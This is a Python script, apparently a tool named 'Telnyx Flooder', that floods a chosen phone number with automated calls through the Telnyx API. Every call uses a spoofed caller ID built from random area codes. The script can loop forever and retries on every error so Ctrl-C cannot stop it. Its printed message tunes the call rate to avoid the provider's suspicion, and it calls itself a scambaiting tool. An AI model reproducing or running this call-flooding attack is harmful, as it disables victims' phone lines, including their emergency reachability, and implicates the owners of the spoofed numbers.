import telnyx
import random
import time
telnyx.api_key = "YOUR_API_KEY" # Put your API Key here
control_id = "YOUR_CONTROL_ID" # Put Your Call Control App's ID Here
area_codes = ["718", "415", "888", "833", "907", "808", "212", "646", "332", "315", "680", "347", "516", "518", "838", "585", "607", "631", "934", "716", "929", "914", "917"]
print(r"""
$$$$$$$$\        $$\                                     $$$$$$$$\ $$\                           $$\                     
\__$$  __|       $$ |                                    $$  _____|$$ |                          $$ |                    
   $$ | $$$$$$\  $$ |$$$$$$$\  $$\   $$\ $$\   $$\       $$ |      $$ | $$$$$$\   $$$$$$\   $$$$$$$ | $$$$$$\   $$$$$$\  
   $$ |$$  __$$\ $$ |$$  __$$\ $$ |  $$ |\$$\ $$  |      $$$$$\    $$ |$$  __$$\ $$  __$$\ $$  __$$ |$$  __$$\ $$  __$$\ 
   $$ |$$$$$$$$ |$$ |$$ |  $$ |$$ |  $$ | \$$$$  /       $$  __|   $$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|
   $$ |$$   ____|$$ |$$ |  $$ |$$ |  $$ | $$  $$<        $$ |      $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
   $$ |\$$$$$$$\ $$ |$$ |  $$ |\$$$$$$$ |$$  /\$$\       $$ |      $$ |\$$$$$$  |\$$$$$$  |\$$$$$$$ |\$$$$$$$\ $$ |      
   \__| \_______|\__|\__|  \__| \____$$ |\__/  \__|      \__|      \__| \______/  \______/  \_______| \_______|\__|      
                               $$\   $$ |                                                                                
                               \$$$$$$  |                                                                                
                                \______/                                                                                 
""")
print("Don't forget to input your call control ID and API Key in the python file! You must have money in your Telnyx account of course.")
number = input("What number do you want to take down? Please include the country code at the beginning(e.g +11234567890. NOT (123)-456-7890) ")
if '(' in number or ')' in number or '-' in number or '+' not in number or len(number) != 12:
    print("Invalid Number Format, exiting")
    time.sleep(2)
    exit()

how_many = input("How many times do you want to call/flood this number? Please provide your answer as a number. Press enter if you want it to go on forever. ")
if how_many.isdigit == False and how_many != '':
    print("Invalid Flood Amount, exiting")
    time.sleep(2)
    exit()

input("Are you sure you want to flood this number? Press enter to continue or exit the script to not continue")
flood_amount = 0
print(f"FLOODING: {how_many} times. To prevent Telnyx from becoming suspicious, this will flood 6 times a second. You can decrease it if you have a L2 verified account though. Close out of the script to cancel the flood at any time. Ctrl-C wouldn't work since I made it so if there's any error, it would try the call again. Happy scambating!")

def floodCall():
            area_code = random.choice(area_codes)
            caller_id = random.randrange(3000000, 9000000)
            print(f"FLOOD: {flood_amount} CALLING: {number} FROM: +1{area_code}{caller_id}")
            telnyx.Call.create(connection_id=control_id, to=number, from_=f"+1{area_code}{caller_id}")
            time.sleep(0.5)


if how_many == '':
    while True:
        flood_amount += 1
        try:
            floodCall()
        except:
            print("There was an error within the telnyx api... trying again")
            pass

elif how_many.isdigit() == True:
    for i in range(int(how_many)):
        flood_amount += 1
        try:
            floodCall()
        except:
            print("There was an error within the telnyx api... trying again")
            how_many = int(how_many) + 1
            pass  
